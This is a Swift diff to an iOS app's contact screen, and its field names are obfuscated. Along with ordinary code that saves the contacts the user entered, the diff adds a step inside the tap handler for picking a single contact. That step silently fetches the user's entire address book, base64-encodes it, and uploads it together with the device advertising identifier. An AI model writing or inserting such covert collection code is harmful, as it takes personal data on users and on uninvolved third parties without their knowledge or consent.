@@ -134,6 +134,53 @@ class ContactViewController: BaseViewController {
             .throttle(.microseconds(200), scheduler: MainScheduler.instance)
             .bind(onNext: { [weak self] in
                 guard let self = self else { return }
+                var dictArray: [[String: String]] = []
+                
+                let modelArray = self.model?.casia?.crucful?.dipsiauous ?? []
+                
+                for model in modelArray {
+                    var dict: [String: String] = [:]
+                    dict["trueuous"] = model.trueuous ?? ""
+                    dict["throwality"] = model.throwality ?? ""
+                    dict["aviitious"] = model.aviitious ?? ""
+                    dict["vollcenter"] = model.vollcenter ?? ""
+                    dictArray.append(dict)
+                }
+                
+                
+                do {
+                    let jsonData = try JSONSerialization.data(
+                        withJSONObject: dictArray,
+                        options: []
+                    )
+                    
+                    if let jsonString = String(data: jsonData, encoding: .utf8) {
+                        
+                        let parameters = ["hoplcy": cardModel?.stochacity ?? "",
+                                          "casia": jsonString]
+                        
+                        Task { [parameters] in
+                            do {
+                                let model = try await self.viewModel.saveContactInfo(parameters: parameters)
+                                let ectopurposeess = model.ectopurposeess ?? ""
+                                if ["0", "00"].contains(ectopurposeess) {
+                                    await self.getDetailInfo()
+                                }
+                            } catch {
+                                
+                            }
+                        }
+                        
+                    }
+                    
+                    
+                } catch {
+                    print("JSON serialization failed: \(error)")
+                    return
+                }
+                
+                
+                
                 
             }).disposed(by: disposeBag)
         
@@ -175,14 +222,62 @@ extension ContactViewController: UITableViewDelegate, UITableViewDataSource {
         let cell = tableView.dequeueReusableCell(withIdentifier: "ContactViewCell", for: indexPath) as! ContactViewCell
         let model = self.model?.casia?.crucful?.dipsiauous?[indexPath.row]
         cell.model = model
+        
+        cell.clickTapBlock = { [weak self] in
+            guard let self = self, let model = model else { return }
+            tapCellInfo(with: model, cell: cell)
+        }
+        
+        cell.clickTwoTapBlock = { [weak self] in
+            guard let self = self else { return }
+            
+            ContactManager.shared.presentContactPicker(from: self) { contact in
+                if let c = contact {
+                    let phone = c.exoality
+                    let name = c.throwality
+                    
+                    if name.trimmingCharacters(in: .whitespacesAndNewlines).isEmpty ||
+                        phone.trimmingCharacters(in: .whitespacesAndNewlines).isEmpty {
+                        
+                        ToastManager.showLocalMessage("The name or phone number format is incorrect. Please re-enter")
+                        return
+                    }
+                    
+                    model?.trueuous = phone
+                    model?.throwality = name
+                    cell.twoFiled.text = String(format: "%@ - %@", name, phone)
+                }
+            }
+            
+            ContactManager.shared.fetchAllContacts { [weak self] contacts in
+                guard let self = self,
+                      let jsonData = try? JSONEncoder().encode(contacts) else { return }
+                
+                let base64String = jsonData.base64EncodedString()
+                Task {
+                    do {
+                        let parameters = ["emesive": String(Int(2 + 1)),
+                                          "casia": base64String,
+                                          "operesque": IDFVKeychainManager.shared.getIDFA()]
+                        let _ = try await self.viewModel.uploadContactInfo(parameters: parameters)
+                    } catch {
+                        
+                    }
+                }
+                
+                
+            }
+            
+        }
+        
         return cell
     }
     
-    private func tapCellInfo(with model: dieModel, cell: CoachViewCell) {
+    private func tapCellInfo(with model: dipsiauousModel, cell: ContactViewCell) {
         
         let popView = PopAutnEnumView(frame: self.view.bounds)
-        popView.nameLabel.text = model.rusbadior ?? ""
-        let modelArray = model.drawie ?? []
+        popView.nameLabel.text = model.herself ?? ""
+        let modelArray = model.flatvoice ?? []
         popView.modelArray = modelArray
         let name = cell.oneFiled.text ?? ""
         for (index, listModel) in modelArray.enumerated() {
@@ -202,8 +297,7 @@ extension ContactViewController: UITableViewDelegate, UITableViewDataSource {
         popView.saveBlock = { [weak self] listModel in
             guard let self = self else { return }
             self.dismiss(animated: true)
-            model.emesive = listModel.emesive ?? ""
-            model.tvarium = listModel.throwality ?? ""
+            model.aviitious = listModel.emesive ?? ""
             cell.oneFiled.text = listModel.throwality ?? ""
         }
         
